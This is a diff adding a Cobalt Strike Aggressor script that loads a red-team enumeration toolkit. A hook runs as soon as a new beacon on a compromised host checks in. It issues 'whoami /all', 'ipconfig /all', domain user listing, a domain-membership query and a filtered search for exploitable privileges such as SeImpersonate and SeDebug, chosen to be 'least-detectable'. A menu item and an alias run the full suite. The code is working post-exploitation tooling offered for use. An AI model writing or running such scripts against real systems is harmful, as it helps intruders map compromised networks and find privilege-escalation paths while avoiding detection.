@@ -1,0 +1,62 @@
+# enum_toolkit.cna — Main loader for the red team enumeration toolkit
+#
+# Load this single file in Cobalt Strike (Aggressor Script Console):
+#   aggressor> load /path/to/cna-enum-toolkit/enum_toolkit.cna
+#
+# It loads all module files relative to this script's own location.
+
+local('$toolkit_dir');
+$toolkit_dir = script_resource("modules");
+
+include($toolkit_dir . "/sys_enum.cna");
+include($toolkit_dir . "/net_enum.cna");
+include($toolkit_dir . "/ad_enum.cna");
+include($toolkit_dir . "/user_enum.cna");
+
+println("\c2[+] enum_toolkit loaded — modules: sys | net | ad | users");
+
+# ─── initial beacon hook (lightweight, non-noisy) ───────────────────────────
+# Fires automatically when a new beacon first checks in.
+# Runs only the fastest / least-detectable subset of enum commands.
+
+on beacon_initial {
+    local('$bid $hostname $user $os $pid');
+    $bid      = $1;
+    $hostname = binfo($bid, "computer");
+    $user     = binfo($bid, "user");
+    $os       = binfo($bid, "os");
+    $pid      = binfo($bid, "pid");
+
+    blog($bid, "\c2[*] New beacon: $hostname | $user | $os | PID:$pid");
+    blog($bid, "\c9[*] Running auto-enum (quick, low-noise)");
+
+    # Quick context
+    bshell($bid, "whoami /all");
+    bshell($bid, "hostname");
+    bshell($bid, "ipconfig /all");
+    bshell($bid, "net user /domain 2>nul || net user");
+
+    # Check if domain-joined
+    bshell($bid, "wmic computersystem get PartOfDomain,Domain /format:list");
+
+    # Quick privilege check
+    bshell($bid, "whoami /priv | findstr /i \"SeImpersonate SeAssignPrimary SeBackup SeRestore SeDebug SeTakeOwnership\"");
+}
+
+# ─── global alias: run everything ───────────────────────────────────────────
+
+alias enum-all {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c4[!] Starting FULL enumeration suite — may be noisy");
+    sys-enum-all($bid);
+    net-enum-all($bid);
+    ad-enum-all($bid);
+    user-enum-all($bid);
+}
+
+popup beacon_bottom {
+    menu "Enum: \[FULL SUITE\]" {
+        item "Run ALL modules" { enum-all(selectedBeacons()); }
+    }
+}
